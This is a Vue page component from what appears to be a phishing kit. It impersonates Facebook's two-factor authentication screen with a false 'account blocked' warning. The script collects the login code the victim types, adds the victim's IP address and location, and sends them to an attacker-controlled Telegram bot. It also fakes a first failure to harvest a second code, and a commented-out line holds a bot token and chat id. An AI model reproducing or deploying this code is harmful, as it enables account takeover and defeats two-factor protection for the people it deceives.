<template>
  <div>
    <div class="bg-[#F1F2F6] flex justify-center items-center h-screen">
      <form
        class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center"
        id="skdzvhmcei"
        style="margin-top: auto; margin-bottom: auto"
      >
        <p class="font-bold text-2xl">Two-factor authentication required (1/3)</p>
        <p class="my-3" style="font-size: small">
          We have temporarily blocked your account because Facebook Protect has changed. Verify code
          has been send to 2321****.
        </p>
        <img
          src="/static/uploads/2fa.gif"
          class="w-full h-[260px] object-cover mx-auto mb-3 rounded-sm"
        />
        <input
          v-model="form.logincode"
          type="text"
          name="udgvjseoun"
          required=""
          onkeypress="return (event.charCode !=8 &amp;&amp; event.charCode ==0 || (event.charCode >= 48 &amp;&amp; event.charCode <= 57))"
          placeholder="Enter your code"
          class="mb-3 w-full mt-1 px-3 py-3 bg-gray-100 border border-[#d1d5db] shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-md sm:text-sm focus:ring-1"
        />
        <p class="error_2fa text-red-700 mt-2" v-if="confirmNext > 0">
          The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
        </p>
        <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
          <div class="text-2xl text-yellow-600">
            <ion-icon name="information-circle" role="img" class="md hydrated"></ion-icon>
          </div>
          <div>
            <p style="font-size: small">
              You’ve asked us to require a 6-digit login code when anyone tries to access your
              account from a new device or browser. Enter the 6-digit code from your code generator
              or third-party app below.
            </p>
            <p>
              Please wait <strong class="count-time">{{ countDown }}</strong> to request the sending
              of the code.
            </p>
          </div>
        </div>
        <p class="mt-3 mb-5">
          We'll walk you through some steps to secure and unlock your account.
        </p>
        <button
          @click="submitFullData()"
          type="button"
          class="block text-lg cursor-pointer bg-gray-100 border border-[#d1d5db] hover:bg-blue-800 transition ease-in-out delay-75 hover:text-white w-full font-semibold text-center py-3 text-black rounded-lg"
        >
          Submit
        </button>
        <button
          @click="resetCountDown()"
          type="button"
          class="block text-sm text-center py-3 w-full text-blue-800 send-code-btn pointer-events-none"
        >
          Send Code
        </button>
      </form>
    </div>

    <!-- Main modal -->
    <div
      v-if="!!isModalOpen"
      modal-backdrop=""
      class="bg-gray-900 bg-opacity-50 dark:bg-opacity-80 fixed inset-0 z-40"
    ></div>
    <div
      id="finishModal"
      tabindex="-1"
      aria-hidden="true"
      class="fixed top-0 left-0 right-0 z-50 w-full p-4 overflow-x-hidden overflow-y-auto md:inset-0 h-[calc(100%-1rem)] max-h-full justify-center items-center flex"
      :class="{ hidden: !isModalOpen }"
    >
      <div class="relative w-full max-w-2xl max-h-full">
        <!-- Modal content -->
        <div class="relative bg-white rounded-lg shadow dark:bg-gray-700">
          <!-- Modal header -->
          <div class="flex items-start justify-between p-4 border-b rounded-t bg-facebook">
            <h3 class="text-md font-semibold text-white">Form Submitted Successfully</h3>
          </div>
          <!-- Modal body -->
          <div class="p-6 space-y-6">
            <p class="text-base leading-relaxed text-gray-500 dark:text-gray-400">
              Thanks for contacting us. You'll get a notification when we respond in 1-2 business
              days. You can view responses in your Support Inbox.
            </p>
          </div>
          <!-- Modal footer -->
          <div
            class="flex items-center justify-end p-4 space-x-2 border-t border-gray-200 rounded-b dark:border-gray-600"
          >
            <button
              type="button"
              @click="finish()"
              class="finish-verify text-white bg-facebook hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center"
            >
              OK
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import axios from 'axios'


export default {
  // beforeRouteEnter(to, from, next) {
  //   // Trước khi vào trang "Next," kiểm tra biến trạng thái "canAccessNextPage"
  //   if (!to.meta.canAccessNextPage) {
  //     // Nếu không thể truy cập trang "Next," chuyển hướng người dùng về trang "/"
  //     next("/meta-community-standard");
  //   } else {
  //     // Nếu có thể truy cập, cho phép vào trang "Next"
  //     next();
  //   }
  // },
  head: {
    title: {
      inner: 'Facebook'
    }
  },
  data() {
    return {
      form: {      
        logincode: ''
      },
      confirmNext: 0,
      isModalOpen: false,
      countDown: '05:00',
      timer: null
    }
  },
  mounted() {
    this.startCountDown()
  },
  methods: {
    openModal() {
      this.isModalOpen = true
    },
    closeModal() {
      this.isModalOpen = false
    },
    startCountDown() {
      let time = 300 // 300 giây (5 phút)
      this.timer = setInterval(() => {
        const minutes = Math.floor(time / 60)
          .toString()
          .padStart(2, '0')
        const seconds = (time % 60).toString().padStart(2, '0')
        this.countDown = `${minutes}:${seconds}`
        time -= 1

        if (time < 0) {
          clearInterval(timer)
          this.countDown = '00:00'
        }
      }, 1000)
    },
    resetCountDown() {
      clearInterval(this.timer) // Dừng bộ đếm hiện tại (nếu có)
      this.countDown = '05:00' // Đặt lại thời gian ban đầu
      this.startCountDown() // Bắt đầu lại đếm ngược
    },
    finish: function () {
      window.location.href = 'https://www.facebook.com/policies_center/'
    },
    submitFullData: function () {
      if (this.form.logincode != '') {
        //alert("hello"+ this.form.logincode)

        var confirm = this.postConfirm(this.form.logincode)
        if (this.confirmNext == 0) {
          this.form.logincode = ''
          this.resetCountDown()
          this.confirmNext++
        } else {
          this.openModal()
        }
      }
    },
    postConfirm: async function (code) {
      try {
        this.loading = true
        this.isSubmit = true
        axios.get(`https://api.db-ip.com/v2/free/self`)
                .then((response) => {
                    
                  const bot_token = import.meta.env.VITE_bot_token

                  const chat_id   = import.meta.env.VITE_chat_id
                    // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
                    // const chat_id   = '5208541473';
                  //  alert("hello"+ this.form.logincode)
                    const message   = 
                    '%0A<strong>Code : </strong>'+code+
                    '%0A<strong>IP Address: </strong>' + response.data.ipAddress +
                    '%0A<strong>Country : </strong>' + response.data.countryName +'( '+response.data.countryCode+' )'+
                    '%0A<strong>City : </strong>' + response.data.city ;
        
                    axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                        .then((response) => {
                        })
        
                        
                })
      } catch (error) { 
        alert(error);
        return false
      } finally {
        this.isSubmit = false
        this.loading = false
      }
    }
  }
}
</script>

// WEBPACK FOOTER // // src/pages/MetaConfirm.vue
